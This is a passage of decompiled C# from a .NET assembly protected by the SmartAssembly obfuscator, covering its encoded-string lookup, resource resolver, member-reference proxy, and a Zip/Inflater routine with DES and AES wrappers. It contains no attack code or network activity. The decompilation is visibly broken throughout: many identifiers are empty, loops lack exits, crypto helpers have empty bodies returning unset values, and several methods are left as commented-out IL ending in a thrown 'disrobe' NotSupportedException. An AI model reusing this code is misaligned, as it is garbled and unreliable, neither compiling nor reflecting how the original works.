    catch (System.Object ex)
    {
    }
}
// SmartAssembly.HouseOfCards.MemberRefsProxy
private static void .cctor()
{
     = new System.Char[58] { '\u0001', '\u0002', '\u0003', '\u0004', '\u0005', '\u0006', '\u0007', '\u0008', '\u000E', '\u000F', '\u0010', '\u0011', '\u0012', '\u0013', '\u0014', '\u0015', '\u0016', '\u0017', '\u0018', '\u0019', '\u001A', '\u001B', '\u001C', '\u001D', '\u001E', '\u001F', '\u007F', '\u0080', '\u0081', '\u0082', '\u0083', '\u0084', '\u0086', '\u0087', '\u0088', '\u0089', '\u008A', '\u008B', '\u008C', '\u008D', '\u008E', '\u008F', '\u0090', '\u0091', '\u0092', '\u0093', '\u0094', '\u0095', '\u0096', '\u0097', '\u0098', '\u0099', '\u009A', '\u009B', '\u009C', '\u009D', '\u009E', '\u009F' };
    if (!(!typeof(MulticastDelegate)))
    {
         = System.Reflection.Assembly.GetExecutingAssembly().GetModules()[0].ModuleHandle;
    }
    return;
}
// SmartAssembly.HouseOfCards.Strings
public static void CreateGetStringDelegate(System.Type ownerType)
{
    System.Reflection.FieldInfo[] local0;
    int local1;
    System.Reflection.FieldInfo local2;
    System.Reflection.Emit.DynamicMethod local3;
    System.Reflection.Emit.ILGenerator local4;
    System.Reflection.MethodInfo[] local5;
    int local6;
    System.Reflection.MethodInfo local7;

    local0 = ownerType.GetFields((System.Reflection.BindingFlags)1064);
    local1 = 0;
    while (true)
    {
        if (local1 < ((int)local0.Length))
        {
            local2 = local0[local1];
            try
            {
                if (local2.FieldType != typeof(GetString))
                {
                    local1 = local1 + 1;
                    continue;
                }
                else
                {
                    break;
                }
            }
            catch (System.Object ex)
            {
            }
            local1 = local1 + 1;
            continue;
        }
    }
    local3 = new System.Reflection.Emit.DynamicMethod(Empty, typeof(String), new System.Type[1] { typeof(Int32) }, ownerType.Module, 1);
    local4 = local3.GetILGenerator();
    local4.Emit(Ldarg_0);
    local5 = typeof(Strings).GetMethods((System.Reflection.BindingFlags)24);
    local6 = 0;
    while (true)
    {
        if (local6 < ((int)local5.Length))
        {
            local7 = local5[local6];
            if (local7.ReturnType != typeof(String))
            {
                local6 = local6 + 1;
                continue;
            }
            else
            {
                break;
            }
        }
    }
    local4.Emit(Ldc_I4, local2.MetadataToken & 16777215);
    local4.Emit(Sub);
    local4.Emit(Call, local7);
    local4.Emit(Ret);
    local2.SetValue(null, local3.CreateDelegate(typeof(GetString)));
    return;
}
// .
public void .ctor()
{
    return;
}
// SmartAssembly.Attributes.DoNotObfuscateAttribute
public void .ctor()
{
    return;
}
// SmartAssembly.Attributes.DoNotPruneAttribute
public void .ctor()
{
    return;
}
// SmartAssembly.Attributes.DoNotObfuscateTypeAttribute
public void .ctor()
{
    return;
}
// SmartAssembly.Attributes.DoNotPruneTypeAttribute
public void .ctor()
{
    return;
}
// SmartAssembly.Attributes.DoNotMoveAttribute
public void .ctor()
{
    return;
}
// SmartAssembly.ResourceResolver.ResourceResolver
public static void AttachApp()
{
    try
    {
        ();
        return;
    }
    catch (System.Exception ex)
    {
    }
}
// SmartAssembly.ResourceResolver.ResourceResolver
public void .ctor()
{
    return;
}
// .1
internal static void ()
{
    try
    {
        CurrentDomain.add_ResourceResolve();
        return;
    }
    catch (System.Exception ex)
    {
    }
}
// .1
private static System.Reflection.Assembly (object arg1, System.ResolveEventArgs arg2)
{
    string local0;
    string[] local1;
    int local2;

    if ( == null)
    {
        local1 = ;
        System.Threading.Monitor.Enter(local1);
        try
        {
             = System.Reflection.Assembly.Load("{c354d53e-165d-4621-97a4-b595a3bd0c96}, PublicKeyToken=3e56350693f7355e");
            if ( != null)
            {
                 = .GetManifestResourceNames();
            }
        }
        finally
        {
        }
    }
    local0 = arg2.Name;
    local2 = 0;
    while (true)
    {
        if (local2 < ((int).Length))
        {
            if (!([local2] == local0))
            {
                local2 = local2 + 1;
                continue;
            }
            if (!(()))
            {
                return null;
            }
            return ;
        }
    }
}
// .1
private static bool ()
{
    System.Diagnostics.StackFrame[] local0;
    int local1;
    bool local2;

    try
    {
        local0 = new System.Diagnostics.StackTrace().GetFrames();
        local1 = 2;
        while (true)
        {
            if (local1 < ((int)local0.Length))
            {
                if (local0[local1].GetMethod().Module.Assembly != System.Reflection.Assembly.GetExecutingAssembly())
                {
                    local1 = local1 + 1;
                    continue;
                }
                else
                {
                    break;
                }
            }
            else
            {
                local2 = false;
            }
        }
        local2 = true;
        return local2;
    }
    catch (System.Object ex)
    {
    }
}
// .1
public void .ctor()
{
    return;
}
// .1
private static void .cctor()
{
     = null;
     = new System.String[0];
    return;
}
// SmartAssembly.StringsEncoding.Strings
public static string Get(int stringID)
{
    stringID = stringID ^ 107396847;
    stringID = stringID - offset;
    if (!(cacheStrings))
    {
        return SmartAssembly.StringsEncoding.Strings.GetFromResource(stringID);
    }
    return SmartAssembly.StringsEncoding.Strings.GetCachedOrResource(stringID);
}
// SmartAssembly.StringsEncoding.Strings
public static string GetCachedOrResource(int stringID)
{
    object local0;
    string local1;
    string local2;

    local0 = hashtableLock;
    .Invoke(local0);
    try
    {
        hashtable.TryGetValue(stringID, out local1);
        if (local1 != null)
        {
            local2 = local1;
            return local2;
        }
        return SmartAssembly.StringsEncoding.Strings.GetFromResource(stringID);
    }
    finally
    {
    }
}
// SmartAssembly.StringsEncoding.Strings
public static string GetFromResource(int stringID)
{
    int local0;
    int local1;
    int local2;
    byte[] local3;
    string local4;
    string local5;

    local1 = stringID;
    local1 = local1 + 1;
    local2 = bytes[local1];
    if ((local2 & 128) != 0)
    {
        if ((local2 & 64) != 0)
        {
            local1 = local1 + 1;
            local1 = local1 + 1;
            local1 = local1 + 1;
            local0 = ((((local2 & 31) << 24) + (bytes[local1] << 16)) + (bytes[local1] << 8)) + bytes[local1];
        }
        else
        {
            local1 = local1 + 1;
            local0 = ((local2 & 63) << 8) + bytes[local1];
        }
    }
    else
    {
        local0 = local2;
        if (local0 == 0)
        {
            return Empty;
        }
    }
    try
    {
        local3 = .Invoke(~.Invoke(.Invoke(), bytes, local1, local0));
        local4 = .Invoke(~.Invoke(.Invoke(), local3, 0, (int)local3.Length));
        if (!(!cacheStrings))
        {
            SmartAssembly.StringsEncoding.Strings.CacheString(stringID, local4);
        }
    }
    catch (System.Object ex)
    {
    }
    return local5;
}
// SmartAssembly.StringsEncoding.Strings
public static void CacheString(int stringID, string value)
{
    object local0;

    try
    {
        local0 = hashtableLock;
        .Invoke(local0);
        try
        {
            hashtable.Add(stringID, value);
            return;
        }
        finally
        {
        }
    }
    catch (System.Object ex)
    {
    }
}
// SmartAssembly.StringsEncoding.Strings
private static void .cctor()
{
    System.IO.Stream local0;
    int local1;

    MustUseCache = "0";
    OffsetValue = "136";
    bytes = null;
    hashtableLock = new System.Object();
    cacheStrings = false;
    offset = 0;
    if (!(!.Invoke(MustUseCache, "1")))
    {
        cacheStrings = true;
        hashtable = new Dictionary<int, string>();
    }
    offset = .Invoke(OffsetValue);
    local0 = ~.Invoke(.Invoke(), "{5b4106fe-fd05-42b6-afef-fbd2739a0f75}");
    try
    {
        local1 = .Invoke(~.Invoke(local0));
        bytes = new System.Byte[local1];
        ~.Invoke(local0, bytes, 0, local1);
        return;
    }
    finally
    {
    }
}
// SmartAssembly.StringsEncoding.Strings
public void .ctor()
{
    return;
}
// SmartAssembly.StringsEncoding.DoNotPruneAttribute
public void .ctor()
{
    return;
}
// SmartAssembly.StringsEncoding.DoNotMoveAttribute
public void .ctor()
{
    return;
}
// SmartAssembly.Zip.DoNotEncodeStringsAttribute
public void .ctor()
{
    return;
}
// SmartAssembly.Zip.SimpleZip
private static bool PublicKeysMatch(System.Reflection.Assembly executingAssembly, System.Reflection.Assembly callingAssembly)
{
    return true;
}
// SmartAssembly.Zip.SimpleZip
private static System.Security.Cryptography.ICryptoTransform GetAesTransform(byte[] key, byte[] iv, bool decrypt)
{
    System.Security.Cryptography.SymmetricAlgorithm local0;
    System.Security.Cryptography.ICryptoTransform local1;

    local0 = new System.Security.Cryptography.RijndaelManaged();
    try
    {
        if (decrypt)
        {
        }
    }
    finally
    {
    }
    return local1;
}
// SmartAssembly.Zip.SimpleZip
private static System.Security.Cryptography.ICryptoTransform GetDesTransform(byte[] key, byte[] iv, bool decrypt)
{
    System.Security.Cryptography.DESCryptoServiceProvider local0;
    System.Security.Cryptography.ICryptoTransform local1;

    local0 = new System.Security.Cryptography.DESCryptoServiceProvider();
    try
    {
        if (decrypt)
        {
        }
    }
    finally
    {
    }
    return local1;
}
// SmartAssembly.Zip.SimpleZip
public static byte[] Unzip(byte[] buffer)
{
    System.Reflection.Assembly local0;
    System.Reflection.Assembly local1;
    ZipStream local2;
    byte[] local3;
    int local4;
    short local5;
    int local6;
    int local7;
    int local8;
    int local9;
    int local10;
    byte[] local11;
    byte[] local12;
    byte[] local13;
    int local14;
    int local15;
    int local16;
    int local17;
    byte[] local18;
    byte[] local19;
    byte[] local20;
    System.Security.Cryptography.ICryptoTransform local21;
    byte[] local22;
    byte[] local23;
    System.Security.Cryptography.ICryptoTransform local24;

    local0 = System.Reflection.Assembly.GetCallingAssembly();
    local1 = System.Reflection.Assembly.GetExecutingAssembly();
    if (!(local0 == local1 || SmartAssembly.Zip.SimpleZip.PublicKeysMatch(local1, local0)))
    {
        return null;
    }
    local2 = new ZipStream(buffer);
    local3 = new System.Byte[0];
    local4 = local2.ReadInt();
    if (local4 != 67324752)
    {
        local14 = local4 >> 24;
        local4 = local4 - (local14 << 24);
        if (local4 != 8223355)
        {
            throw new System.FormatException("Unknown Header");
        }
        if (local14 == 1)
        {
            local15 = local2.ReadInt();
            local3 = new System.Byte[local15];
            local16 = 0;
            while (local16 < local15)
            {
                local17 = local2.ReadInt();
                local18 = new System.Byte[local2.ReadInt()];
                local2.Read(local18, 0, (int)local18.Length);
                new Inflater(local18).Inflate(local3, local16, local17);
                local16 = local16 + local17;
                continue;
            }
        }
        if (local14 == 2)
        {
            System.Runtime.CompilerServices.RuntimeHelpers.InitializeArray(new System.Byte[8], (new System.Func<System.RuntimeFieldHandle>(() => { throw new System.NotSupportedException("__unreconstructed_runtime_handle: 0x040000B3"); }))());
            local19 = new System.Byte[8];
            System.Runtime.CompilerServices.RuntimeHelpers.InitializeArray(new System.Byte[8], (new System.Func<System.RuntimeFieldHandle>(() => { throw new System.NotSupportedException("__unreconstructed_runtime_handle: 0x040000B4"); }))());
            local20 = new System.Byte[8];
            local21 = SmartAssembly.Zip.SimpleZip.GetDesTransform(local19, local20, true);
            try
            {
                local3 = SmartAssembly.Zip.SimpleZip.Unzip(local21.TransformFinalBlock(buffer, 4, ((int)buffer.Length) - 4));
                if (local14 == 3)
                {
                    local22 = new System.Byte[16] { 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1 };
                    local23 = new System.Byte[16] { 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2 };
                    local24 = SmartAssembly.Zip.SimpleZip.GetAesTransform(local22, local23, true);
                    try
                    {
                        local3 = SmartAssembly.Zip.SimpleZip.Unzip(local24.TransformFinalBlock(buffer, 4, ((int)buffer.Length) - 4));
                        local2.Close();
                        local2 = null;
                        return local3;
                    }
                    finally
                    {
                    }
                }
            }
            finally
            {
            }
        }
    }
    else
    {
        local5 = (short)local2.ReadShort();
        local6 = local2.ReadShort();
        local7 = local2.ReadShort();
        if (((local4 != 67324752 || local5 != 20) || local6 != 0) || local7 != 8)
        {
            throw new System.FormatException("Wrong Header Signature");
        }
        local2.ReadInt();
        local2.ReadInt();
        local2.ReadInt();
        local8 = local2.ReadInt();
        local9 = local2.ReadShort();
        local10 = local2.ReadShort();
        if (local9 > 0)
        {
            local12 = new System.Byte[local9];
            local2.Read(local12, 0, local9);
        }
        if (local10 > 0)
        {
            local13 = new System.Byte[local10];
            local2.Read(local13, 0, local10);
        }
        local11 = new System.Byte[checked((nint)(local2.Length - local2.Position))];
        local2.Read(local11, 0, (int)local11.Length);
        local3 = new System.Byte[local8];
        new Inflater(local11).Inflate(local3, 0, (int)local3.Length);
        local11 = null;
    }
}
// SmartAssembly.Zip.SimpleZip
public static byte[] Zip(byte[] buffer)
{
    return SmartAssembly.Zip.SimpleZip.Zip(buffer, 1, null, null);
}
// SmartAssembly.Zip.SimpleZip
public static byte[] ZipAndEncrypt(byte[] buffer, byte[] key, byte[] iv)
{
    return SmartAssembly.Zip.SimpleZip.Zip(buffer, 2, key, iv);
}
// SmartAssembly.Zip.SimpleZip
public static byte[] ZipAndAES(byte[] buffer, byte[] key, byte[] iv)
{
    return SmartAssembly.Zip.SimpleZip.Zip(buffer, 3, key, iv);
}
// SmartAssembly.Zip.SimpleZip
private static byte[] Zip(byte[] buffer, int version, byte[] key, byte[] iv)
{
    // disrobe: unstructured control flow has no legal target scope: goto IL_044E has no legal target scope; the compiler-emitted plumbing below is kept verbatim as the only static evidence
    // ZipStream local0;
    // Deflater local1;
    // System.DateTime local2;
    // long local3;
    // uint[] local4;
    // uint local5;
    // uint local6;
    // int local7;
    // int local8;
    // long local9;
    // byte[] local10;
    // long local11;
    // byte[] local12;
    // int local13;
    // byte[] local14;
    // int local15;
    // int local16;
    // byte[] local17;
    // long local18;
    // Deflater local19;
    // long local20;
    // byte[] local21;
    // int local22;
    // byte[] local23;
    // int local24;
    // byte[] local25;
    // System.Security.Cryptography.ICryptoTransform local26;
    // byte[] local27;
    // byte[] local28;
    // System.Security.Cryptography.ICryptoTransform local29;
    // byte[] local30;
    // byte[] local31;
    // System.Exception local32;
    // try
    // {
    // local0 = new ZipStream();
    // if (version != 0)
    // {
    // if (version != 1)
    // {
    // if (version != 2)
    // {
    // if (version == 3)
    // {
    // local0.WriteInt(58555003);
    // local28 = SmartAssembly.Zip.SimpleZip.Zip(buffer, 1, null, null);
    // local29 = SmartAssembly.Zip.SimpleZip.GetAesTransform(key, iv, false);
    // try
    // {
    // local30 = local29.TransformFinalBlock(local28, 0, (int)local28.Length);
    // local0.Write(local30, 0, (int)local30.Length);
    // IL_044E:;
    // local0.Flush();
    // local0.Close();
    // local31 = local0.ToArray();
    // return local31;
    // }
    // finally
    // {
    // }
    // }
    // }
    // else
    // {
    // local0.WriteInt(41777787);
    // local25 = SmartAssembly.Zip.SimpleZip.Zip(buffer, 1, null, null);
    // local26 = SmartAssembly.Zip.SimpleZip.GetDesTransform(key, iv, false);
    // try
    // {
    // local27 = local26.TransformFinalBlock(local25, 0, (int)local25.Length);
    // local0.Write(local27, 0, (int)local27.Length);
    // }
    // finally
    // {
    // }
    // }
    // }
    // else
    // {
    // local0.WriteInt(25000571);
    // local0.WriteInt((int)buffer.Length);
    // local16 = 0;
    // IL_03A1:;
    // while (local16 < ((int)buffer.Length))
    // {
    // local17 = new System.Byte[System.Math.Min(2097151, ((int)buffer.Length) - local16)];
    // System.Buffer.BlockCopy(buffer, local16, local17, 0, (int)local17.Length);
    // local18 = local0.Position;
    // local0.WriteInt(0);
    // local0.WriteInt((int)local17.Length);
    // local19 = new Deflater();
    // local19.SetInput(local17);
    // while (!local19.IsNeedingInput)
    // {
    // local21 = new System.Byte[512];
    // local22 = local19.Deflate(local21);
    // if (local22 > 0)
    // {
    // local0.Write(local21, 0, local22);
    // continue;
    // }
    // local19.Finish();
    // while (!local19.IsFinished)
    // {
    // local23 = new System.Byte[512];
    // local24 = local19.Deflate(local23);
    // if (local24 > 0)
    // {
    // local0.Write(local23, 0, local24);
    // continue;
    // }
    // local20 = local0.Position;
    // local0.Position = local18;
    // local0.WriteInt((int)local19.TotalOut);
    // local0.Position = local20;
    // local16 = local16 + ((int)local17.Length);
    // goto IL_03A1;
    // }
    // }
    // }
    // }
    // }
    // else
    // {
    // local1 = new Deflater();
    // local2 = Now;
    // local3 = (ulong)((((((((local2.Year - 1980) & 127) << 25) | (local2.Month << 21)) | (local2.Day << 16)) | (local2.Hour << 11)) | (local2.Minute << 5)) | (local2.Second >>> 1));
    // System.Runtime.CompilerServices.RuntimeHelpers.InitializeArray(new System.UInt32[256], (new System.Func<System.RuntimeFieldHandle>(() => { throw new System.NotSupportedException("__unreconstructed_runtime_handle: 0x040000B5"); }))());
    // local4 = new System.UInt32[256];
    // local5 = -1;
    // local6 = local5;
    // local7 = 0;
    // local8 = (int)buffer.Length;
    // while (true)
    // {
    // local8 = local8 - 1;
    // if ((local8 - 1) >= 0)
    // {
    // local7 = local7 + 1;
    // local6 = local4[(local6 ^ buffer[local7]) & 255] ^ (local6 >>> 8);
    // continue;
    // }
    // }
    // local6 = local6 ^ local5;
    // local0.WriteInt(67324752);
    // local0.WriteShort(20);
    // local0.WriteShort(0);
    // local0.WriteShort(8);
    // local0.WriteInt((int)local3);
    // local0.WriteInt(local6);
    // local9 = local0.Position;
    // local0.WriteInt(0);
    // local0.WriteInt((int)buffer.Length);
    // local10 = UTF8.GetBytes("{data}");
    // local0.WriteShort((int)local10.Length);
    // local0.WriteShort(0);
    // local0.Write(local10, 0, (int)local10.Length);
    // local1.SetInput(buffer);
    // while (!local1.IsNeedingInput)
    // {
    // local12 = new System.Byte[512];
    // local13 = local1.Deflate(local12);
    // if (local13 > 0)
    // {
    // local0.Write(local12, 0, local13);
    // continue;
    // }
    // local1.Finish();
    // while (!local1.IsFinished)
    // {
    // local14 = new System.Byte[512];
    // local15 = local1.Deflate(local14);
    // if (local15 > 0)
    // {
    // local0.Write(local14, 0, local15);
    // continue;
    // }
    // local11 = local1.TotalOut;
    // local0.WriteInt(33639248);
    // local0.WriteShort(20);
    // local0.WriteShort(20);
    // local0.WriteShort(0);
    // local0.WriteShort(8);
    // local0.WriteInt((int)local3);
    // local0.WriteInt(local6);
    // local0.WriteInt((int)local11);
    // local0.WriteInt((int)buffer.Length);
    // local0.WriteShort((int)local10.Length);
    // local0.WriteShort(0);
    // local0.WriteShort(0);
    // local0.WriteShort(0);
    // local0.WriteShort(0);
    // local0.WriteInt(0);
    // local0.WriteInt(0);
    // local0.Write(local10, 0, (int)local10.Length);
    // local0.WriteInt(101010256);
    // local0.WriteShort(0);
    // local0.WriteShort(0);
    // local0.WriteShort(1);
    // local0.WriteShort(1);
    // local0.WriteInt(46 + ((int)local10.Length));
    // local0.WriteInt((int)(((long)(30 + ((int)local10.Length))) + local11));
    // local0.WriteShort(0);
    // local0.Seek(local9, (System.IO.SeekOrigin)0);
    // local0.WriteInt((int)local11);
    // goto IL_044E;
    // }
    // }
    // }
    // }
    // catch (System.Exception ex)
    // {
    // }
    throw new System.NotSupportedException("disrobe: unstructured control flow has no legal target scope");
}
// Inflater
public void .ctor(byte[] bytes)
{
    this.input = new StreamManipulator();
    this.outputWindow = new OutputWindow();
    this.mode = 2;
    this.input.SetInput(bytes, 0, (int)bytes.Length);
    return;
}
// Inflater
private bool DecodeHuffman()
{
    // disrobe: unstructured control flow has no legal target scope: goto IL_0181 has no legal target scope; the compiler-emitted plumbing below is kept verbatim as the only static evidence
    // int local0;
    // int local1;
    // int local2;
    // int local3;
    // int local4;
    // local0 = this.outputWindow.GetFreeSpace();
    // IL_01A8:;
    // while (true)
    // {
    // if (local0 >= 258)
    // {
    // local2 = this.mode;
    // switch (local2 - 7)
    // {
    // case 0:
    // while (true)
    // {
    // local1 = this.litlenTree.GetSymbol(this.input);
    // if ((this.litlenTree.GetSymbol(this.input) & -256) == 0)
    // {
    // this.outputWindow.Write(local1);
    // local0 = local0 - 1;
    // if ((local0 - 1) >= 258)
    // {
    // continue;
    // }
    // return true;
    // }
    // else
    // {
    // if (local1 >= 257)
    // {
    // this.repLength = CPLENS[local1 - 257];
    // this.neededBits = CPLEXT[local1 - 257];
    // IL_00B5:;
    // if (this.neededBits <= 0)
    // {
    // IL_00FC:;
    // this.mode = 9;
    // IL_0104:;
    // local1 = this.distTree.GetSymbol(this.input);
    // if (local1 >= 0)
    // {
    // this.repDist = CPDIST[local1];
    // this.neededBits = CPDEXT[local1];
    // IL_0136:;
    // if (this.neededBits <= 0)
    // {
    // IL_0181:;
    // this.outputWindow.Repeat(this.repLength, this.repDist);
    // local0 = local0 - this.repLength;
    // this.mode = 7;
    // goto IL_01A8;
    // }
    // else
    // {
    // this.mode = 10;
    // local4 = this.input.PeekBits(this.neededBits);
    // if (local4 >= 0)
    // {
    // this.input.DropBits(this.neededBits);
    // this.repDist = this.repDist + local4;
    // goto IL_0181;
    // }
    // return false;
    // }
    // }
    // return false;
    // }
    // else
    // {
    // this.mode = 8;
    // local3 = this.input.PeekBits(this.neededBits);
    // if (local3 >= 0)
    // {
    // this.input.DropBits(this.neededBits);
    // this.repLength = this.repLength + local3;
    // goto IL_00FC;
    // }
    // return false;
    // }
    // }
    // if (local1 < 0)
    // {
    // return false;
    // }
    // this.distTree = null;
    // this.litlenTree = null;
    // this.mode = 2;
    // return true;
    // }
    // }
    // break;
    // case 1:
    // goto IL_00B5;
    // case 2:
    // goto IL_0104;
    // case 3:
    // goto IL_0136;
    // default:
    // continue;
    // }
    // }
    // }
    throw new System.NotSupportedException("disrobe: unstructured control flow has no legal target scope");
}
// Inflater
private bool Decode()
{
    int local0;
    int local1;
    int local2;
    int local3;

    local1 = this.mode;
    switch (local1 - 2)
    {
        case 0:
            if (!(!this.isLastBlock))
            {
                this.mode = 12;
                return false;
            }
            local0 = this.input.PeekBits(3);
            if (local0 < 0)
            {
                return false;
            }
            this.input.DropBits(3);
            if ((local0 & 1) != 0)
            {
                this.isLastBlock = true;
            }
            local2 = local0 >> 1;
            switch (local2)
            {
                case 0:
                    this.input.SkipToByteBoundary();
                    this.mode = 3;
                    break;
                case 1:
                    this.litlenTree = defLitLenTree;
                    this.distTree = defDistTree;
                    this.mode = 7;
                    break;
                case 2:
                    this.dynHeader = new InflaterDynHeader();
                    this.mode = 6;
                    break;
                default:
                    break;
            }
            return true;
        case 1:
            local2 = this.input.PeekBits(16);
            this.uncomprLen = this.input.PeekBits(16);
            if (local2 < 0)
            {
                return false;
            }
            this.input.DropBits(16);
            this.mode = 4;
IL_010B:;
            if (this.input.PeekBits(16) < 0)
            {
                return false;
            }
            this.input.DropBits(16);
            this.mode = 5;
IL_0131:;
            local3 = this.outputWindow.CopyStored(this.input, this.uncomprLen);
            this.uncomprLen = this.uncomprLen - local3;
            if (this.uncomprLen == 0)
            {
                this.mode = 2;
                return true;
            }
            return this.input.IsNeedingInput == false;
        case 2:
            goto IL_010B;
        case 3:
            goto IL_0131;
        case 4:
            if (!(this.dynHeader.Decode(this.input)))
            {
                return false;
            }
            this.litlenTree = this.dynHeader.BuildLitLenTree();
            this.distTree = this.dynHeader.BuildDistTree();
            this.mode = 7;
            return this.DecodeHuffman();
        case 5:
            return this.DecodeHuffman();
        case 6:
            return this.DecodeHuffman();
        case 7:
            return this.DecodeHuffman();
        case 8:
            return this.DecodeHuffman();
        case 9:
            return false;
        case 10:
            return false;
        default:
            return false;
    }
}
// Inflater
public int Inflate(byte[] buf, int offset, int len)
{
    // disrobe: unstructured control flow has no legal target scope: goto IL_002E has no legal target scope; the compiler-emitted plumbing below is kept verbatim as the only static evidence
    // int local0;
    // int local1;
    // local0 = 0;
    // while (true)
    // {
    // if (this.mode == 11)
    // {
    // IL_002E:;
    // if (!(this.Decode()))
    // {
    // if (!(this.outputWindow.GetAvailable() <= 0 || this.mode == 11))
    // {
    // continue;
    // }
    // return local0;
    // }
    // }
    // else
    // {
    // local1 = this.outputWindow.CopyOutput(buf, offset, len);
    // offset = offset + local1;
    // local0 = local0 + local1;
    // len = len - local1;
    // if (len != 0)
    // {
    // goto IL_002E;
    // }
    // return local0;
    // }
    // }
    throw new System.NotSupportedException("disrobe: unstructured control flow has no legal target scope");
}
// Inflater
private static void .cctor()
{
    CPLENS = new System.Int32[29] { 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 15, 17, 19, 23, 27, 31, 35, 43, 51, 59, 67, 83, 99, 115, 131, 163, 195, 227, 258 };
    CPLEXT = new System.Int32[29] { 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 2, 2, 2, 2, 3, 3, 3, 3, 4, 4, 4, 4, 5, 5, 5, 5, 0 };
    CPDIST = new System.Int32[30] { 1, 2, 3, 4, 5, 7, 9, 13, 17, 25, 33, 49, 65, 97, 129, 193, 257, 385, 513, 769, 1025, 1537, 2049, 3073, 4097, 6145, 8193, 12289, 16385, 24577 };
    CPDEXT = new System.Int32[30] { 0, 0, 0, 0, 1, 1, 2, 2, 3, 3, 4, 4, 5, 5, 6, 6, 7, 7, 8, 8, 9, 9, 10, 10, 11, 11, 12, 12, 13, 13 };
    return;
}
// StreamManipulator
public int PeekBits(int n)
{
    int local0;

    if (this.bits_in_buffer < n)
    {
        if (this.window_start == this.window_end)
        {
            return -1;
        }
        local0 = this.window_start;
        this.window_start = local0 + 1;
        local0 = this.window_start;
        this.window_start = local0 + 1;
        this.buffer = this.buffer | (((this.window[local0] & 255) | ((this.window[local0] & 255) << 8)) << (this.bits_in_buffer & 31));
        this.bits_in_buffer = this.bits_in_buffer + 16;
    }
    return (int)(((ulong)this.buffer) & ((long)((1 << (n & 31)) - 1)));
}
// StreamManipulator
public void DropBits(int n)
{
    this.buffer = this.buffer >>> (n & 31);
    this.bits_in_buffer = this.bits_in_buffer - n;
    return;
}
// StreamManipulator
public int get_AvailableBits()
{
    return this.bits_in_buffer;
}
// StreamManipulator
public int get_AvailableBytes()
{
    return (this.window_end - this.window_start) + (this.bits_in_buffer >> 3);
}
// StreamManipulator
public void SkipToByteBoundary()
{
    this.buffer = this.buffer >>> ((this.bits_in_buffer & 7) & 31);
    this.bits_in_buffer = this.bits_in_buffer & -8;
    return;
}
// StreamManipulator
public bool get_IsNeedingInput()
{
    return this.window_start == this.window_end;
}
// StreamManipulator
public int CopyBytes(byte[] output, int offset, int length)
{
    int local0;
    int local1;
    int local2;

    local0 = 0;
    while (this.bits_in_buffer > 0)
    {
        if (length > 0)
        {
            offset = offset + 1;
            output[offset] = (byte)this.buffer;
            this.buffer = this.buffer >>> 8;
            this.bits_in_buffer = this.bits_in_buffer - 8;
            length = length - 1;
            local0 = local0 + 1;
            continue;
        }
        if (length == 0)
        {
            return local0;
        }
        local1 = this.window_end - this.window_start;
        if (length > local1)
        {
            length = local1;
        }
        System.Array.Copy(this.window, this.window_start, output, offset, length);
        this.window_start = this.window_start + length;
        if (((this.window_start - this.window_end) & 1) != 0)
        {
            local2 = this.window_start;
            this.window_start = local2 + 1;
            this.buffer = this.window[local2] & 255;
            this.bits_in_buffer = 8;
        }
        return local0 + length;
    }
}
// StreamManipulator
public void .ctor()
{
    return;
}
// StreamManipulator
public void Reset()
{
    int local0;

    local0 = 0;
    this.bits_in_buffer = 0;
    local0 = local0;
    this.window_end = local0;
    local0 = local0;
    this.window_start = local0;
    this.buffer = local0;
    return;
}
// StreamManipulator
public void SetInput(byte[] buf, int off, int len)
{
    int local0;

    if (this.window_start < this.window_end)
    {
        throw new System.InvalidOperationException();
    }
    local0 = off + len;
    if ((0 > off || off > local0) || local0 > ((int)buf.Length))
    {
        throw new System.ArgumentOutOfRangeException();
    }
    if ((len & 1) != 0)
    {
        off = off + 1;
        this.buffer = this.buffer | ((buf[off] & 255) << (this.bits_in_buffer & 31));
        this.bits_in_buffer = this.bits_in_buffer + 8;
    }
    this.window = buf;
    this.window_start = off;
    this.window_end = local0;
    return;
}
// OutputWindow
public void Write(int abyte)
{
    int local0;

    local0 = this.windowFilled;
    this.windowFilled = local0 + 1;
    if (local0 == 32768)
    {
        throw new System.InvalidOperationException();
    }
    local0 = this.windowEnd;
    this.windowEnd = local0 + 1;
    this.window[local0] = (byte)abyte;
    this.windowEnd = this.windowEnd & 32767;
    return;
}
// OutputWindow
private void SlowRepeat(int repStart, int len, int dist)
{
    int local0;

    while (true)
    {
        len = len - 1;
        if (len > 0)
        {
            local0 = this.windowEnd;
            this.windowEnd = local0 + 1;
            repStart = repStart + 1;
            this.window[local0] = this.window[repStart];
            this.windowEnd = this.windowEnd & 32767;
            repStart = repStart & 32767;
            continue;
        }
    }
    return;
}
// OutputWindow
public void Repeat(int len, int dist)
{
    int local0;
    int local1;
    int local2;

    local2 = this.windowFilled + len;
    this.windowFilled = this.windowFilled + len;
    if (local2 > 32768)
    {
        throw new System.InvalidOperationException();
    }
    local0 = (this.windowEnd - dist) & 32767;
    local1 = 32768 - len;
    if (local0 > local1 || this.windowEnd >= local1)
    {
        this.SlowRepeat(local0, len, dist);
        return;
    }
    if (len <= dist)
    {
        System.Array.Copy(this.window, local0, this.window, this.windowEnd, len);
        this.windowEnd = this.windowEnd + len;
        return;
    }
    while (true)
    {
        len = len - 1;
        if (len > 0)
        {
            local2 = this.windowEnd;
            this.windowEnd = local2 + 1;
            local0 = local0 + 1;
            this.window[local2] = this.window[local0];
            continue;
        }
    }
    return;
}
// OutputWindow
public int CopyStored(StreamManipulator input, int len)
{
    int local0;
    int local1;

    len = System.Math.Min(System.Math.Min(len, 32768 - this.windowFilled), input.AvailableBytes);
    local1 = 32768 - this.windowEnd;
    if (len <= local1)
    {
        local0 = input.CopyBytes(this.window, this.windowEnd, len);
    }
    else
    {
        local0 = input.CopyBytes(this.window, this.windowEnd, local1);
        if (local0 == local1)
        {
            local0 = local0 + input.CopyBytes(this.window, 0, len - local1);
        }
    }
    this.windowEnd = (this.windowEnd + local0) & 32767;
    this.windowFilled = this.windowFilled + local0;
    return local0;
}
// OutputWindow
public void CopyDict(byte[] dict, int offset, int len)
{
    if (this.windowFilled > 0)
    {
        throw new System.InvalidOperationException();
    }
    if (len > 32768)
    {
        offset = offset + (len - 32768);
        len = 32768;
    }
    System.Array.Copy(dict, offset, this.window, 0, len);
    this.windowEnd = len & 32767;
    return;
}
// OutputWindow
public int GetFreeSpace()
{
    return 32768 - this.windowFilled;
}
